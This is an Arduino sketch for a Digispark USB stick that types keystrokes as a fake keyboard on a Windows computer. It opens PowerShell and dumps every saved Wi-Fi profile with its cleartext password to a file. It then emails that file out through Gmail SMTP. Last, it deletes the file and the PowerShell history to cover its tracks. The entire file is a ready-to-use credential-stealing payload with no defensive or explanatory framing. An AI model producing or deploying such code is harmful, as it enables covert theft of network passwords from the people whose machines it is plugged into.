#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Out-File wifi.txt"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT WHICH SENDS THE EMAIL', 'PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'ACCOUNT WHICH RECIEVES THE EMAIL'; $ReportEmail.To.Add('ACCOUNT WHICH RECIEVES THE EMAIL'); $ReportEmail.Subject = 'EMAIL SUBJECT'; $ReportEmail.Body = 'EMAIL TEXT'; $ReportEmail.Attachments.Add('wifi.txt'); $SMTPInfo.Send($ReportEmail); exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("del wifi.txt"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("cd .."));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("cd .."));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("cd WINDOWS/system32"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
